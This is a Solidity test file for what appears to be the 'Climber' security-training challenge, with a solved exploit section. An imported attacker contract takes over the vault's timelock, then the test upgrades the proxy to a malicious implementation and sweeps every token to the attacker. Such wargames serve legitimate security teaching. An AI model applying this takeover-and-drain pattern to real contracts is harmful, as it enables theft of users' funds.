// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "../../src/DamnValuableToken.sol";
import "../../src/climber/ClimberVault.sol";
import "../../src/climber/ClimberTimelock.sol";
import "../../src/attacker-contracts/climber/ClimberVaultV2.sol";
import "../../src/attacker-contracts/climber/ClimberAttacker.sol";

contract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {
    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}
}

contract ClimberTest is Test {
    DamnValuableToken public token;
    ClimberVault public vault;
    AdminUpgradeabilityProxy public proxy;
    ClimberTimelock public timelock;

    address public deployer = address(1);
    address public attacker = address(2);
    address public proposer = address(3);
    address public sweeper = address(4);

    uint256 public constant VAULT_TOKEN_BALANCE = 10000000 ether;

    function setUp() public {
        startHoax(deployer);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        ClimberVault impl = new ClimberVault();
        proxy = new AdminUpgradeabilityProxy(
            address(impl),
            address(10),
            abi.encodeWithSignature(
                "initialize(address,address,address)",
                deployer,
                proposer,
                sweeper
            )
        );
        vault = ClimberVault(address(proxy));
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertFalse(vault.owner() == address(0));
        assertFalse(vault.owner() == deployer);

        // Instantiate timelock
        timelock = ClimberTimelock(
            payable(ClimberVault(address(vault)).owner())
        );

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(timelock.PROPOSER_ROLE(), proposer));
        assertTrue(timelock.hasRole(timelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        startHoax(attacker, 0.1 ether);
        ClimberAttacker attackerContract = new ClimberAttacker(payable(address(timelock)), address(vault));
        attackerContract.attack();
        ClimberVaultV2 newVault = new ClimberVaultV2();
        proxy.upgradeTo(address(newVault));
        vault.sweepFunds(address(token));
        vm.stopPrank();

        /** SUCCESS CONDITION */
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(attacker), VAULT_TOKEN_BALANCE);
    }
}
